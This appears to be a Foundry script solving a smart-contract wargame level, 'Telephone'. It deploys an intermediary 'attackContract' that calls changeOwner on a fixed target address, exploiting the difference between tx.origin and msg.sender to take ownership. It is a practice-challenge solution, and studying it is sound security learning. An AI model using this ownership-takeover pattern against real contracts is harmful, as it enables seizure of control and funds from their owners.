// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Lev4Phone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract attackContract {
    constructor(Lev4Phone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract Lev4Sol is Script {
    Lev4Phone public lev4Instance =
        Lev4Phone(payable(0xb38C4C66e5AFb2045A9C91a62E22D420230C2fBE));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new attackContract(lev4Instance, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
